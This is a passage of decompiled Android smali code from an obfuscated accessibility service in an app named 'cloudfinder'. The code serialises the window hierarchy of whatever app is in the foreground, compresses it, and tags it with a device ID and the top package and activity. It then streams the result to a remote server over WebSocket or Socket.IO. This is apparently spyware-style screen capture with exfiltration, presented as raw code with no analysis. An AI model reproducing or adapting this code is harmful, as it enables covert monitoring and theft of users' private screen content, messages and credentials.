    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_6

    goto :goto_1

    :cond_1
    :try_start_4
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityWindowInfo;->getLayer()I

    move-result v1
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_2

    :catch_1
    move v1, v10

    :goto_2
    :try_start_5
    const-string v3, "<node winType=\""

    invoke-virtual {v15, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, " layer=\""

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, "\">"

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v4, 0x0

    const/4 v5, 0x0

    move-object/from16 v1, p0

    move-object/from16 v2, v17

    move-object v3, v15

    move-object/from16 v18, v6

    invoke-virtual/range {v1 .. v6}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ء(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/StringBuilder;IILandroid/graphics/Rect;)V

    const-string v1, "</node>"

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_6

    :try_start_6
    invoke-virtual/range {v17 .. v17}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2

    :catch_2
    move-object/from16 v6, v18

    goto :goto_1

    :cond_2
    :try_start_7
    const-string v0, "</hierarchy>"

    invoke-virtual {v15, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    const/16 v2, 0x28

    if-ge v1, v2, :cond_3

    return-void

    :cond_3
    invoke-static {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->خ(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const-string v0, "deviceId"

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v3

    iget-object v3, v3, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v0, "pkg"

    invoke-virtual {v2, v0, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v0, "ac"

    invoke-virtual {v2, v0, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v0, "w"

    invoke-virtual {v2, v0, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v0, "h"

    invoke-virtual {v2, v0, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v0, "iw"

    invoke-virtual {v2, v0, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v0, "ih"

    invoke-virtual {v2, v0, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v0, "orient"

    const/4 v3, 0x1

    if-le v11, v12, :cond_4

    move v4, v3

    goto :goto_3

    :cond_4
    move v4, v10

    :goto_3
    invoke-virtual {v2, v0, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lںڍڒڸ/ش;->ة(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v0

    const-string v4, "topPkg"

    invoke-virtual {v0, v4, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v4, "topAct"

    invoke-virtual {v0, v4, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v4, "acc"

    invoke-virtual {v0, v4, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v3, "deviceInfo"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v0, "action"

    sget-object v3, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v0, "zip"

    invoke-virtual {v2, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_6

    :try_start_8
    invoke-static {}, Lڜٟٱڀ/ؤ;->؋()Lڜٟٱڀ/ؤ;

    move-result-object v0

    if-eqz v0, :cond_8

    iget-object v3, v0, Lڜٟٱڀ/ؤ;->؋:Lڜٟٱڀ/ش;

    invoke-virtual {v3}, Lڜٟٱڀ/ش;->ء()Z

    move-result v3

    if-eqz v3, :cond_8

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "UTF-8"

    invoke-virtual {v3, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    iget-object v0, v0, Lڜٟٱڀ/ؤ;->؋:Lڜٟٱڀ/ش;

    invoke-virtual {v0}, Lڜٟٱڀ/ش;->ء()Z

    move-result v4

    if-nez v4, :cond_5

    goto :goto_4

    :cond_5
    iget-object v4, v0, Lڜٟٱڀ/ش;->ء:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v4}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v4

    if-eqz v4, :cond_7

    iget-object v0, v0, Lڜٟٱڀ/ش;->؋:Lokhttp3/WebSocket;
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4

    if-nez v0, :cond_6

    goto :goto_4

    :cond_6
    const/4 v4, 0x2

    :try_start_9
    invoke-static {v4, v3}, Lڜٟٱڀ/؋;->؋(B[B)[B

    move-result-object v3

    invoke-static {v3}, Lۀۗ۱/ث;->إ([B)Lۀۗ۱/ث;

    move-result-object v3

    invoke-interface {v0, v3}, Lokhttp3/WebSocket;->send(Lۀۗ۱/ث;)Z

    move-result v0
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_3

    goto :goto_5

    :catch_3
    move-exception v0

    :try_start_a
    const-string v3, "WebTransportMgr"

    const-string v4, "sendTree error"

    invoke-static {v3, v4, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_4

    :cond_7
    :goto_4
    move v0, v10

    :goto_5
    if-eqz v0, :cond_9

    :try_start_b
    const-string v3, "uploadTree SENT via Binary WS"

    invoke-static {v9, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_5

    goto :goto_6

    :catch_4
    :cond_8
    move v0, v10

    :catch_5
    :cond_9
    :goto_6
    if-nez v0, :cond_c

    :try_start_c
    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v0

    iget-object v0, v0, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "uploadTree sender="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    if-eqz v0, :cond_a

    const-string v4, "OK"

    goto :goto_7

    :cond_a
    const-string v4, "NULL"

    :goto_7
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " zipLen="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    if-eqz v1, :cond_b

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v10

    :cond_b
    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v9, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    if-eqz v0, :cond_c

    invoke-virtual {v0, v8, v2}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z

    const-string v0, "uploadTree SENT via Socket.IO"

    invoke-static {v9, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_6

    goto :goto_8

    :catch_6
    move-exception v0

    const-string v1, "uploadTree error"

    invoke-static {v9, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_c
    :goto_8
    return-void
.end method

.method public final ٵ()V
    .locals 6

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sget-wide v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ح:J

    sub-long v2, v0, v2

    const-wide/16 v4, 0xc8

    cmp-long v2, v2, v4

    if-gez v2, :cond_0

    return-void

    :cond_0
    sput-wide v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ح:J

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ج:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lڛڜڕڰڑ/ء;

    const/4 v2, 0x3

    invoke-direct {v1, p0, v2}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    return-void
.end method
